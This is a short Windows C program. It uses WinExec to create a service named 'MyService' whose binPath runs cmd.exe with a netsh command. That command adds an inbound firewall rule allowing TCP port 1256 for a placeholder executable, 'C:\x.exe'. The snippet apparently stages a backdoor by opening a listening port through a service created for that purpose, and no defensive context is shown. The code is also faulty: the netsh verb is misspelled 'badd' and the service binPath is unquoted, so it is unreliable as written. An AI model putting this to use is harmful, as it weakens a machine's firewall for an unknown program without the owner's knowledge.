#include <windows.h>

#define RUN(toRun) WinExec("sc create MyService binPath= cmd.exe /c " toRun, SW_SHOW);

int main() {
    RUN("netsh advfirewall firewall badd rule name=\"some_rule\" dir=in action=allow protocol=TCP localport=1256 program=\"C:\\x.exe\" description=\"xxx\" enable=yes");
    return 0;
}